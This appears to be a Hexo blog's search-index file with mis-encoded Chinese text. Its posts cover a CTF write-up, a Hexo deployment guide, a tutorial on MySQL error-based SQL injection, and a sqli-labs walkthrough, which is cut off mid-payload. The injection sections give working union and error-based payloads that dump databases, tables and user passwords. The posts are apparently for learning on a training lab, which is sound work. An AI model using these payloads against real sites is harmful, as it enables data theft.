Python æ¥å£ã€‚å…¶å®åªéœ€è¦çŸ¥é“è¿™ä¹ˆå‡ ä¸ª API å°±å¯ä»¥äº†ï¼š</p><ol><li><code>file = cv2.VideoCapture(filename):</code> æ‰“å¼€ä¸€ä¸ªè§†é¢‘æ–‡ä»¶ã€‚</li><li><code>file.read() -&gt; ret, frame:</code> è¯»å–è¿™ä¸ªè§†é¢‘æ–‡ä»¶çš„ä¸€å¸§ï¼Œè¿”å›çŠ¶æ€ä¸å¯¹åº”çš„å¸§ã€‚</li><li><code>cv2.absdiff(frame1, frame2):</code> æ¯”è¾ƒä¸¤ä¸ªå¸§ï¼Œè¿”å›ä¸€ä¸ª Arrayã€‚</li><li><code>array.sum():</code> æ±‚ Array çš„å’Œã€‚<br>æ­¤å¤–ä¸ºäº†æ˜¾ç¤ºå›¾ç‰‡ï¼Œå¯ä»¥ä½¿ç”¨ <code>matplotlibï¼Œfrom matplotlib import pyplot as plt</code> ç„¶å <code>plt.imshow(frame)</code> å’Œ <code>plt.show()</code> å°±è¡Œã€‚å®Œæ•´çš„ä»£ç å¦‚ä¸‹:<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">import cv2</span><br><span class="line">from matplotlib import pyplot as plt</span><br><span class="line"></span><br><span class="line">file &#x3D; cv2.VideoCapture(&quot;output-1.mp4&quot;)</span><br><span class="line">ret, preframe &#x3D; file.read()</span><br><span class="line"></span><br><span class="line">while True:</span><br><span class="line">  ret, frame &#x3D; file.read()</span><br><span class="line">  if ret &#x3D;&#x3D; 0:</span><br><span class="line">    break</span><br><span class="line">  diff &#x3D; cv2.absdiff(preframe, frame).sum()</span><br><span class="line">  if diff &gt; 10000:</span><br><span class="line">    print(&quot;diff: &#123;&#125;&quot;.format(diff))</span><br><span class="line">    plt.imshow(frame)</span><br><span class="line">    plt.show()</span><br><span class="line">  preframe &#x3D; frame</span><br></pre></td></tr></table></figure></li></ol>]]></content>
      
      
      
        <tags>
            
            <tag> writeup </tag>
            
            <tag> ctf </tag>
            
            <tag> hackgame </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>MysqlæŠ¥é”™æ³¨å…¥å­¦ä¹ </title>
      <link href="2019/10/25/mysql-wrong-injection/"/>
      <url>2019/10/25/mysql-wrong-injection/</url>
      
        <content type="html"><![CDATA[<p>æœ¬ç¯‡åšå®¢ä¸»è¦ä»‹ç»äº†sqlæ³¨å…¥ä¸­çš„æŠ¥é”™æ³¨å…¥ï¼</p><a id="more"></a><h2 id="ä»€ä¹ˆæ˜¯æŠ¥é”™æ³¨å…¥"><a href="#ä»€ä¹ˆæ˜¯æŠ¥é”™æ³¨å…¥" class="headerlink" title="ä»€ä¹ˆæ˜¯æŠ¥é”™æ³¨å…¥?"></a>ä»€ä¹ˆæ˜¯æŠ¥é”™æ³¨å…¥?</h2><p>SQLæŠ¥é”™æ³¨å…¥å°±æ˜¯åˆ©ç”¨æ•°æ®åº“çš„æŸäº›æœºåˆ¶ï¼Œäººä¸ºåœ°åˆ¶é€ é”™è¯¯æ¡ä»¶ï¼Œä½¿å¾—æŸ¥è¯¢ç»“æœèƒ½å¤Ÿå‡ºç°åœ¨é”™è¯¯ä¿¡æ¯ä¸­ã€‚</p><p>è¿™ç§æ‰‹æ®µåœ¨è”åˆæŸ¥è¯¢å—é™ä¸”èƒ½è¿”å›é”™è¯¯ä¿¡æ¯çš„æƒ…å†µä¸‹æ¯”è¾ƒå¥½ç”¨ï¼Œæ¯•ç«Ÿç”¨ç›²æ³¨çš„è¯æ—¢è€—æ—¶åˆå®¹æ˜“è¢«å°ã€‚</p><p>ä¸»è¦åˆ†ä¸ºä¸‹é¢å‡ ç±»ï¼š</p><ol><li>BigINTæ•°æ®ç±»å‹æº¢å‡º</li><li>Xpathè¯­æ³•é”™è¯¯</li><li>concat+rand()+group_by()å¯¼è‡´ä¸»é”®é‡å¤</li><li>ç©ºé—´æ•°æ®ç±»å‹å‡½æ•°é”™è¯¯</li></ol><h2 id="BigINTæ•°æ®ç±»å‹æº¢å‡º"><a href="#BigINTæ•°æ®ç±»å‹æº¢å‡º" class="headerlink" title="BigINTæ•°æ®ç±»å‹æº¢å‡º"></a>BigINTæ•°æ®ç±»å‹æº¢å‡º</h2><p>è¿™é‡Œå¯ä»¥çœ‹åˆ°mysqlæ˜¯æ€ä¹ˆå¤„ç†æ•´å½¢çš„</p><p><img src="/2019/10/25/mysql-wrong-injection/20191025200205.png"></p><p>åœ¨mysql5.5ä¹‹å‰ï¼Œæ•´å½¢æº¢å‡ºæ˜¯ä¸ä¼šæŠ¥é”™çš„ï¼Œæ ¹æ®å®˜æ–¹æ–‡æ¡£è¯´æ˜<a href="https://dev.mysql.com/doc/refman/5.5/en/out-of-range-and-overflow.html">out-of-range-and-overflow</a>ï¼Œåªæœ‰ç‰ˆæœ¬å·å¤§äº5.5.5æ—¶ï¼Œæ‰ä¼šæŠ¥é”™ã€‚è¯•ç€å¯¹æœ€å¤§æ•°åšåŠ æ³•è¿ç®—ï¼Œå¯ä»¥çœ‹åˆ°æŠ¥é”™çš„å…·ä½“æƒ…å†µï¼š</p><p><img src="/2019/10/25/mysql-wrong-injection/20191025200633.png"></p><p>æˆ‘ä»¬çŸ¥é“ï¼Œå¦‚æœä¸€ä¸ªæŸ¥è¯¢æˆåŠŸè¿”å›ï¼Œåˆ™å…¶è¿”å›å€¼ä¸º0ï¼Œè¿›è¡Œé€»è¾‘éè¿ç®—åå¯å¾—1ï¼Œè¿™ä¸ªå€¼æ˜¯å¯ä»¥è¿›è¡Œæ•°å­¦è¿ç®—çš„ï¼š</p><p><img src="/2019/10/25/mysql-wrong-injection/20191025201535.png"></p><p>åŒç†ï¼Œåˆ©ç”¨expå‡½æ•°ä¹Ÿä¼šäº§ç”Ÿç±»ä¼¼çš„æº¢å‡ºé”™è¯¯</p><p><img src="/2019/10/25/mysql-wrong-injection/20191025201649.png"></p><p><strong>æ³¨å…¥å§¿åŠ¿ï¼š</strong></p><pre><code>select exp(~(select*from(select ****)x));</code></pre><p>åˆ©ç”¨è¿™ä¸€ç‰¹æ€§ï¼Œå†ç»“åˆä¹‹å‰è¯´çš„æº¢å‡ºæŠ¥é”™ï¼Œå°±å¯ä»¥è¿›è¡Œæ³¨å…¥äº†ã€‚è¿™é‡Œéœ€è¦è¯´ä¸€ä¸‹ï¼Œç»ç¬”è€…æµ‹è¯•ï¼Œå‘ç°åœ¨mysql5.5.47å¯ä»¥åœ¨æŠ¥é”™ä¸­è¿”å›æŸ¥è¯¢ç»“æœï¼š</p><p><img src="/2019/10/25/mysql-wrong-injection/20191025204044.png"></p><p>è€Œåœ¨mysql&gt;5.5.53æ—¶ï¼Œåˆ™ä¸èƒ½è¿”å›æŸ¥è¯¢ç»“æœ</p><p><img src="/2019/10/25/mysql-wrong-injection/20191025204127.png"></p><p>æ­¤å¤–ï¼ŒæŠ¥é”™ä¿¡æ¯æ˜¯æœ‰é•¿åº¦é™åˆ¶çš„ï¼Œåœ¨<code>mysql/my_error.c</code>ä¸­å¯ä»¥çœ‹åˆ°ï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;* Max length of a error message. Should be</span><br><span class="line">kept in sync with MYSQL_ERRMSG_SIZE. *&#x2F;</span><br><span class="line">#define ERRMSGSIZE (512)</span><br></pre></td></tr></table></figure><h2 id="xpathè¯­æ³•é”™è¯¯"><a href="#xpathè¯­æ³•é”™è¯¯" class="headerlink" title="xpathè¯­æ³•é”™è¯¯"></a>xpathè¯­æ³•é”™è¯¯</h2><p>ä»mysql5.1.5å¼€å§‹æä¾›ä¸¤ä¸ªXMLæŸ¥è¯¢å’Œä¿®æ”¹çš„å‡½æ•°ï¼Œextractvalueå’Œupdatexmlã€‚</p><p>extractvalueè´Ÿè´£åœ¨xmlæ–‡æ¡£ä¸­æŒ‰ç…§xpathè¯­æ³•æŸ¥è¯¢èŠ‚ç‚¹å†…å®¹ï¼Œupdatexmlåˆ™è´Ÿè´£ä¿®æ”¹æŸ¥è¯¢åˆ°çš„å†…å®¹:</p><p><img src="/2019/10/25/mysql-wrong-injection/20191025210140.png"></p><p>å®ƒä»¬çš„ç¬¬äºŒä¸ªå‚æ•°éƒ½è¦æ±‚æ˜¯ç¬¦åˆxpathè¯­æ³•çš„å­—ç¬¦ä¸²ï¼Œå¦‚æœä¸æ»¡è¶³è¦æ±‚ï¼Œåˆ™ä¼šæŠ¥é”™ï¼Œå¹¶ä¸”å°†æŸ¥è¯¢ç»“æœæ”¾åœ¨æŠ¥é”™ä¿¡æ¯é‡Œï¼š</p><p><img src="/2019/10/25/mysql-wrong-injection/20191025210332.png"></p><h2 id="ä¸»é”®é‡å¤"><a href="#ä¸»é”®é‡å¤" class="headerlink" title="ä¸»é”®é‡å¤"></a>ä¸»é”®é‡å¤</h2><p>è¿™é‡Œåˆ©ç”¨åˆ°äº†count()å’Œgroup byåœ¨é‡åˆ°rand()äº§ç”Ÿçš„é‡å¤å€¼æ—¶æŠ¥é”™çš„æ€è·¯ã€‚ç½‘ä¸Šæ¯”è¾ƒå¸¸è§çš„payloadæ˜¯è¿™æ ·çš„ï¼š<br>    select count(*) from test group by concat(version(),floor(rand(0)*2));</p><p><img src="/2019/10/25/mysql-wrong-injection/20191025210332.png"></p><p><strong>rand()å‡½æ•°ï¼š</strong>è¿”å›ä¸€ä¸ª 0 åˆ° 1 ä¹‹é—´çš„æµ®ç‚¹æ•°ï¼Œå¦‚æœç»™å®šäº†æ•´æ•°å¸¸é‡ Nï¼Œå³ rand(N)ï¼ŒN å°†ä¼šè¢«ç”¨ä½œç§å­å€¼ï¼Œå¹¶äº§ç”Ÿå¯é‡å¤çš„å€¼çš„åºåˆ—</p><p>**floorå‡½æ•°:**è¿”å›å°äºç­‰äºè¯¥å€¼çš„æœ€å¤§æ•´æ•°</p><p>*<em>COUNT()å‡½æ•°:**è¿”å›åŒ¹é…æŒ‡å®šæ¡ä»¶çš„è¡Œæ•°,COUNT(</em>) å‡½æ•°è¿”å›è¡¨ä¸­çš„è®°å½•æ•°</p><p>æŠ¥é”™éœ€è¦count(*)ï¼Œrand()ã€group byï¼Œä¸‰è€…ç¼ºä¸€ä¸å¯</p><p>mysqlçš„å®˜æ–¹æ–‡æ¡£ä¸­å¯¹ rand() å‡½æ•°æœ‰ç‰¹æ®Šçš„è¯´æ˜ï¼š</p><p>å®˜æ–¹æ–‡æ¡£ä¸­çš„æ„æ€æ˜¯ï¼šåœ¨whereè¯­å¥ä¸­ï¼Œwhereæ¯æ‰§è¡Œä¸€æ¬¡ï¼Œrand()å‡½æ•°å°±ä¼šè¢«è®¡ç®—ä¸€æ¬¡ã€‚rand()ä¸èƒ½ä½œä¸ºorder byçš„æ¡ä»¶å­—æ®µï¼ŒåŒç†ä¹Ÿä¸èƒ½ä½œä¸ºgroup byçš„æ¡ä»¶å­—æ®µã€‚</p><p>å› æ­¤åœ¨mysqlä¸­ï¼Œå¯ä»¥æ„é€ ä¸€ä¸ªå€¼ä¸ç¡®å®šè€Œæœ‰å¯é‡å¤çš„å­—æ®µä½œä¸ºgroup byçš„æ¡ä»¶å­—æ®µï¼Œè¿™æ˜¯å°±å¯ä»¥æŠ¥å‡ºç±»ä¼¼äº<code>Duplicate entry &#39;â€¦&#39; for key &#39;group_key&#39;</code>çš„é”™è¯¯ã€‚</p><p>å¦å¤–ï¼Œç»è¿‡æµ‹è¯•</p><p>rand()ä¼šéšæœºæŠ¥é”™ï¼Œå°±æ˜¯æœ‰å¯èƒ½æŠ¥é”™ï¼Œæœ‰çš„æ—¶å€™ä¸ä¼šï¼Œ</p><p>rand(0)è‚¯å®šä¼šæŠ¥é”™ï¼Œrand(1)åˆ™ä¸€å®šä¸ä¼šæŠ¥é”™ã€‚</p><p>æ‰€ä»¥è¦è®©ä»–æŠ¥é”™çš„è¯ç›´æ¥ç”¨rand(0)</p><p>åŸç†è¯·å‚è§ï¼š<a href="http://heartsky.info/2016/12/04/%E5%87%A0%E7%A7%8D%E5%B8%B8%E8%A7%81%E7%9A%84%20MySQL%20%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5/">http://heartsky.info/2016/12/04/å‡ ç§å¸¸è§çš„%20MySQL%20æŠ¥é”™æ³¨å…¥/</a></p><p>ä»¥sqli-labsä¸­çš„Less-5ä¸ºä¾‹</p><p><strong>çˆ†æ•°æ®åº“</strong></p><pre><code>?id=1&#39; union select count(*),2,3 from users group by concat(database(),floor(rand(0)*2))%23</code></pre><p><img src="/2019/10/25/mysql-wrong-injection/20191025212947.png"></p><p><strong>çˆ†è¡¨å’Œå­—æ®µ</strong></p><pre><code>?id=1&#39; union select count(*),2,3 from information_schema.tables group by concat((select concat(table_schema,&#39;:&#39;,table_name) from information_schema.tables limit 1,1),floor(rand(0)*2))%23</code></pre><h2 id="ä¸€äº›ç‰¹æ€§"><a href="#ä¸€äº›ç‰¹æ€§" class="headerlink" title="ä¸€äº›ç‰¹æ€§"></a>ä¸€äº›ç‰¹æ€§</h2><h3 id="åˆ—åé‡å¤"><a href="#åˆ—åé‡å¤" class="headerlink" title="åˆ—åé‡å¤"></a>åˆ—åé‡å¤</h3><p>mysqlåˆ—åé‡å¤ä¼šæŠ¥é”™ï¼Œæˆ‘ä»¬åˆ©ç”¨name_constæ¥åˆ¶é€ ä¸€ä¸ªåˆ—ï¼š</p><p><img src="/2019/10/25/mysql-wrong-injection/20191025213830.png"></p><p>æ ¹æ®å®˜æ–¹æ–‡æ¡£ï¼Œname_constå‡½æ•°è¦æ±‚å‚æ•°å¿…é¡»æ˜¯å¸¸é‡ï¼Œæ‰€ä»¥å®é™…ä½¿ç”¨ä¸Šè¿˜æ²¡æ‰¾åˆ°ä»€ä¹ˆæ¯”è¾ƒå¥½çš„åˆ©ç”¨æ–¹å¼ã€‚</p><p>åˆ©ç”¨è¿™ä¸ªç‰¹æ€§åŠ ä¸Šjoinå‡½æ•°(çŸ¥é“è¡¨å)å¯ä»¥çˆ†åˆ—åï¼š</p><p><img src="/2019/10/25/mysql-wrong-injection/20191025214442.png"></p><p><img src="/2019/10/25/mysql-wrong-injection/20191025214633.png"></p><p>è¿™æ ·ç´¯åŠ çš„æ–¹å¼å°±å¯ä»¥çˆ†å‡ºæ‰€æœ‰çš„å­—æ®µ</p><h3 id="å‡ ä½•å‡½æ•°"><a href="#å‡ ä½•å‡½æ•°" class="headerlink" title="å‡ ä½•å‡½æ•°"></a>å‡ ä½•å‡½æ•°</h3><p>mysqlæœ‰äº›å‡ ä½•å‡½æ•°ï¼Œä¾‹å¦‚geometrycollection()ï¼Œmultipoint()ï¼Œpolygon()ï¼Œmultipolygon()ï¼Œlinestring()ï¼Œmultilinestring()ï¼Œè¿™äº›å‡½æ•°å¯¹å‚æ•°è¦æ±‚æ˜¯å½¢å¦‚(1 2,3 3,2 2 1)è¿™æ ·å‡ ä½•æ•°æ®ï¼Œå¦‚æœä¸æ»¡è¶³è¦æ±‚ï¼Œåˆ™ä¼šæŠ¥é”™ã€‚ç»æµ‹è¯•ï¼Œåœ¨ç‰ˆæœ¬å·ä¸º5.5.47ä¸Šå¯ä»¥ç”¨æ¥æ³¨å…¥ï¼Œè€Œåœ¨5.7.17ä¸Šåˆ™ä¸è¡Œï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">5.5.47</span><br><span class="line">mysql&gt; select multipoint((select * from (select * from (select version())a)b));</span><br><span class="line">ERROR 1367 (22007): Illegal non geometric &#39;(select &#96;b&#96;.&#96;version()&#96; from ((select &#39;5.5.47&#39; AS &#96;version()&#96; from dual) &#96;b&#96;))&#39; value found during parsing</span><br><span class="line">5.7.17</span><br><span class="line">mysql&gt; select multipoint((select * from (select * from (select version())a)b));</span><br><span class="line">ERROR 1367 (22007): Illegal non geometric &#39;(select &#96;a&#96;.&#96;version()&#96; from ((select version() AS &#96;version()&#96;) &#96;a&#96;))&#39; value found during parsing</span><br></pre></td></tr></table></figure><p>å‚è€ƒï¼š<br><a href="https://xz.aliyun.com/t/253">https://xz.aliyun.com/t/253</a><br><a href="https://hatboy.github.io/2018/08/28/MySQL%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5/">https://hatboy.github.io/2018/08/28/MySQLæŠ¥é”™æ³¨å…¥/</a></p>]]></content>
      
      
      
        <tags>
            
            <tag> web </tag>
            
            <tag> ctf </tag>
            
            <tag> sqlæ³¨å…¥ </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>hexoåšå®¢éƒ¨ç½²åˆ°é˜¿é‡Œäº‘</title>
      <link href="2019/10/19/hexo-deploy-aliyun/"/>
      <url>2019/10/19/hexo-deploy-aliyun/</url>
      
        <content type="html"><![CDATA[<p>æœ¬ç¯‡åšå®¢ä»‹ç»äº†å¦‚ä½•å°†hexoåšå®¢éƒ¨ç½²åˆ°è‡ªå·±çš„æœåŠ¡å™¨ä¸Šï¼Œgithubå®åœ¨æ˜¯å¤ªæ…¢äº†2333333â€¦â€¦</p><h2 id="æœåŠ¡å™¨å®‰è£…å¿…è¦ç¯å¢ƒ"><a href="#æœåŠ¡å™¨å®‰è£…å¿…è¦ç¯å¢ƒ" class="headerlink" title="æœåŠ¡å™¨å®‰è£…å¿…è¦ç¯å¢ƒ"></a>æœåŠ¡å™¨å®‰è£…å¿…è¦ç¯å¢ƒ</h2><p><strong>å®‰è£…git</strong></p><pre><code>apt-get install git</code></pre><p><strong>å®‰è£…nginx(å®å¡”ä¸€é”®å®‰è£…)</strong></p><pre><code>apt-get install nginx</code></pre><p>æœ¬åœ°ç¯å¢ƒé…ç½®å°±ä¸ä»‹ç»äº†</p><h2 id="é…ç½®ssh-ä»“åº“-ç½‘ç«™æ ¹ç›®å½•"><a href="#é…ç½®ssh-ä»“åº“-ç½‘ç«™æ ¹ç›®å½•" class="headerlink" title="é…ç½®ssh,ä»“åº“,ç½‘ç«™æ ¹ç›®å½•"></a>é…ç½®ssh,ä»“åº“,ç½‘ç«™æ ¹ç›®å½•</h2><p><strong>æ·»åŠ ç”¨æˆ·</strong></p><pre><code>useradd git    //æ·»åŠ gitç”¨æˆ·passwd git    //ä¸ºgitç”¨æˆ·è®¾ä¸ªå¯†ç </code></pre><p><strong>é…ç½®ssh</strong></p><pre><code>cd /home</code></pre><p>å¦‚æœæ²¡æœ‰gitæ–‡ä»¶å¤¹åˆ›å»ºä¸€ä¸ª</p><pre><code>mkdir /home/git</code></pre><p>æœ‰çš„è¯è·³è¿‡</p><pre><code>su git    //åˆ‡æ¢gitç”¨æˆ·mkdir /home/git/.ssh    touch /home/git/.ssh/authorized_keysvi /home/git/.ssh/authorized_keys</code></pre><p>é‡Œé¢å†…å®¹å¡«æœ¬æœºé‡Œå¾—å¯¹åº”ç”¨æˆ·ç›®å½•ä¸‹çš„<code>.ssh/id_rsa.pub</code>çš„å†…å®¹</p><p>é…ç½®å®Œå¯ä»¥sshç™»é™†ä¸€ä¸‹</p><p><strong>é…ç½®ä»“åº“</strong></p><p>å¯ä»¥åœ¨<code>/home/git/</code>ä¸‹æ–°å»ºä¸€ä¸ªblog.gitæ–‡ä»¶å¤¹ï¼Œç”¨äºå»ºç«‹gitä»“åº“</p><pre><code>git init --bare blog.git</code></pre><p>å»ºç«‹é’©å­(æœ¬åœ°éƒ¨ç½²åˆ°æœåŠ¡å™¨ä¼šæ‰§è¡Œ)</p><pre><code>vi ~/blog.git/hooks/post-receive</code></pre><p>å¡«å…¥ä»¥ä¸‹å†…å®¹ï¼Œwork-treeæ˜¯ç½‘ç«™ç›®å½•ï¼Œgit-diræ˜¯gitä»“åº“ç›®å½•</p><pre><code>git --work-tree=/home/git/hexo --git-dir=/home/git/blog.git checkout -f</code></pre><p>å»ºç«‹hexoæ–‡ä»¶å¤¹</p><pre><code>mkdir /home/git/hexo</code></pre><p>å°†gitæ–‡ä»¶å¤¹æ‰€æœ‰è€…æ›´æ”¹ä¸ºgitç”¨æˆ·ï¼Œå¹¶å°†ç”¨æˆ·ç›®å½•æƒé™æ”¹ä¸º775ï¼Œå³å…è®¸gitç”¨æˆ·å†™å…¥</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">chown -R git:git git&#x2F;&#x2F;æƒé™é—®é¢˜å¯èƒ½ä¼šæ˜¯æŠ¥é”™çš„ä¸»è¦åŸå› </span><br><span class="line">chmod -R git 775</span><br></pre></td></tr></table></figure><img src="/2019/10/19/hexo-deploy-aliyun/TIMæˆªå›¾20200120212501.png" style="zoom:50%;"><p><strong>é…ç½®ç½‘ç«™æ ¹ç›®å½•</strong></p><pre><code>nginx -t //æŸ¥çœ‹nginxé…ç½®æ–‡ä»¶ä½ç½®</code></pre><p><img src="/2019/10/19/hexo-deploy-aliyun/20191019172010.png"></p><pre><code>cat /www/server/nginx/conf/nginx.conf</code></pre><img src="/2019/10/19/hexo-deploy-aliyun/20191019172243.png" style="zoom: 67%;">    <p>æ²¡æœ‰å‘ç°æœ‰å’Œç½‘ç«™ç›¸å…³çš„ï¼Œä½†æ˜¯å‘ç°äº†åŒ…å«äº†æ–‡ä»¶</p><pre><code>cd /www/server/panel/vhost/nginx/ls</code></pre><p>å‘ç°éƒ½æ˜¯ç½‘ç«™çš„é…ç½®æ–‡ä»¶ï¼Œæˆ‘ç”¨å®å¡”ä¸€é”®åˆ›å»ºçš„ç½‘ç«™(ä¸çŸ¥é“ä¸ºå•¥æºç ä¸èƒ½æ”¾åœ¨<code>/www/wwwroot</code>ä¸‹)ï¼Œæ‰€ä»¥é‡Œé¢æœ‰<code>ç½‘ç«™.conf</code></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">server</span><br><span class="line">&#123;</span><br><span class="line">    listen 80;</span><br><span class="line">    listen [::]:80;</span><br><span class="line">    server_name ä½ çš„æœåŠ¡å™¨åœ°å€;</span><br><span class="line">    index index.php index.html index.htm default.php default.htm default.html;</span><br><span class="line">    root &#x2F;home&#x2F;git&#x2F;hexo;</span><br><span class="line">....</span><br></pre></td></tr></table></figure><p>å®å¡”å¯ä»¥ä¸€é”®ä¿®æ”¹ç›®å½•</p><h2 id="éƒ¨ç½²"><a href="#éƒ¨ç½²" class="headerlink" title="éƒ¨ç½²"></a>éƒ¨ç½²</h2><p>æ›´æ”¹æœ¬åœ°<code>_config.yml</code>æ–‡ä»¶</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">deploy:</span><br><span class="line">  type: git</span><br><span class="line">  repo:</span><br><span class="line">    aliyun: git@ä½ çš„æœåŠ¡å™¨åœ°å€:&#x2F;home&#x2F;git&#x2F;blog.git,master</span><br></pre></td></tr></table></figure><p>ç„¶å<br>    hexo g<br>    hexo d</p><p>è¿˜è¦æ‰‹åŠ¨è¿è¡Œä¸€ä¸‹ä¹‹å‰è®¾ç½®é‚£ä¸ªé’©å­ï¼Œç”¨å®å¡”åˆ›å»ºå¯èƒ½ä¼šç”Ÿæˆ<code>.user.ini</code>æ–‡ä»¶ï¼Œå¯èƒ½ä¼šå¹²æ‰°ï¼Œå»ºè®®åˆ é™¤</p><p>å°±å¯ä»¥éƒ¨ç½²åˆ°<code>/home/git/hexo</code>æ–‡ä»¶å¤¹é‡Œäº†</p><p>â€‹    </p>]]></content>
      
      
      
        <tags>
            
            <tag> åšå®¢ </tag>
            
            <tag> æŠ˜è…¾ </tag>
            
            <tag> hexo </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>sqli-labsé€šå…³æ‰‹å†Œ</title>
      <link href="2019/10/17/sqli-labs-wp/"/>
      <url>2019/10/17/sqli-labs-wp/</url>
      
        <content type="html"><![CDATA[<p>æœ¬ç¯‡åšå®¢ä»‹ç»äº†sqli-labsé€šå…³æ•™ç¨‹ï¼æŒç»­æ›´æ–°ä¸­ï¼</p><a id="more"></a><h2 id="Less-1"><a href="#Less-1" class="headerlink" title="Less-1"></a>Less-1</h2><p>å¯¹äºsqlæ˜¾é”™æ³¨å…¥é¦–å…ˆåº”è¯¥æƒ³åˆ°çš„æ—¶åç«¯sqlè¯­å¥çš„æ ¼å¼</p><p>æ¥ä¸‹æ¥çš„Less-1~Less-4éƒ½æ˜¯ç”¨è”åˆæŸ¥è¯¢çš„æ–¹å¼</p><p>å…ˆæµ‹è¯•ä¸‹æ­£å¸¸å›æ˜¾çš„æƒ…å†µå§</p><pre><code>?id=1</code></pre><p>å‘ç°æ­£å¸¸å›æ˜¾</p><p>æƒ³åŠæ³•æŠ¥é”™</p><pre><code>?id=1%27</code></pre><p>å‘ç°å›æ˜¾è¿™</p><p><img src="/2019/10/17/sqli-labs-wp/20191014222818.png"></p><p>åˆ†æä¸€ä¸‹</p><pre><code>&#39;&#39;1&#39;&#39; LIMIT 0,1&#39;        å·¦å³ä¸¤ç«¯çš„&#39;&#39;ä»£è¡¨é‡Œé¢çš„å†…å®¹ä¸ºå­—ç¬¦ä¸²ï¼Œ&#39;1&#39;&#39;ç›¸å½“äº&#39;$id&#39;</code></pre><p>è€Œåå°çš„sqlè¯­å¥ä¸º</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$sql&#x3D;&quot;SELECT * FROM users WHERE id&#x3D;&#39;$id&#39; LIMIT 0,1&quot;;</span><br></pre></td></tr></table></figure><p>æ­£å¦‚å›æ˜¾çš„é”™è¯¯ä¸€è‡´</p><p><strong>order byåˆ¤æ–­åˆ—æ•°</strong></p><pre><code>?id=1%27%20order%20by%204%23  //å›æ˜¾é”™è¯¯?id=1%27%20order%20by%203%23    //å›æ˜¾æ­£å¸¸</code></pre><p>è¯æ˜ä»£å…¥æŸ¥è¯¢çš„å­—æ®µå…±3åˆ—</p><p>åˆ¤æ–­å›æ˜¾ä½ï¼š</p><pre><code>?id=-1%27%20union%20select%201,2,3%23</code></pre><p>//å›æ˜¾ä½ä¸º2ï¼Œ3</p><p><img src="/2019/10/17/sqli-labs-wp/20191014225208.png"></p><p><strong>çˆ†æ•°æ®åº“ï¼š</strong></p><pre><code>?id=-1%27%20union%20select%201,group_concat(schema_name),3%20from%20information_schema.schemata%23</code></pre><p><img src="/2019/10/17/sqli-labs-wp/20191014230246.png"></p><p><strong>çˆ†è¡¨ï¼š</strong></p><pre><code>?id=-1%27%20union%20select%201,group_concat(table_name),3%20from%20information_schema.tables%20where%20table_schema=%27security%27%23æˆ–?id=-1&#39; union select 1,group_concat(table_name),3 from information_schema.tables where table_schema=database()%23</code></pre><p><img src="/2019/10/17/sqli-labs-wp/20191014230817.png"></p><p><strong>çˆ†å­—æ®µï¼š</strong></p><pre><code>?id=-1&#39; union select 1,group_concat(column_name),3 from information_schema.columns where table_schema=database() and table_name=&#39;users&#39;%23</code></pre><p><img src="/2019/10/17/sqli-labs-wp/20191014231232.png"></p><p><strong>çˆ†å†…å®¹ï¼š</strong></p><pre><code>?id=-1&#39; union select 1,group_concat(id,0x23,username,0x23,password),3 from security.users%23</code></pre><p><img src="/2019/10/17/sqli-labs-wp/20191014231909.png"></p><p><strong>çˆ†æ•°æ®åº“ï¼š</strong></p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1&#x27; and extractvalue(1,concat(0x7e,(database())))%23</span><br></pre></td></tr></table></figure><p><strong>çˆ†è¡¨ï¼š</strong></p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1&#x27; and extractvalue(1,concat(0x7e,(<span class="keyword">select</span> <span class="keyword">group_concat</span>(table_name) <span class="keyword">from</span> information_schema.tables <span class="keyword">where</span> table_schema=<span class="keyword">database</span>())))%<span class="number">23</span></span><br></pre></td></tr></table></figure><p><strong>çˆ†å­—æ®µï¼š</strong></p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1&#x27; and extractvalue(1,concat(0x7e,(<span class="keyword">select</span> <span class="keyword">group_concat</span>(column_name) <span class="keyword">from</span> information_schema.columns <span class="keyword">where</span> table_schema=<span class="keyword">database</span>() <span class="keyword">and</span> table_name=<span class="string">&#x27;users&#x27;</span>)))%<span class="number">23</span></span><br></pre></td></tr></table></figure><p><strong>çˆ†å†…å®¹ï¼š</strong></p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1&#x27; and extractvalue(1,concat(0x7e,(<span class="keyword">select</span> <span class="keyword">group_concat</span>(<span class="keyword">id</span>,<span class="number">0x23</span>,username,<span class="number">0x23</span>,<span class="keyword">password</span>) <span class="keyword">from</span> security.users)))%<span 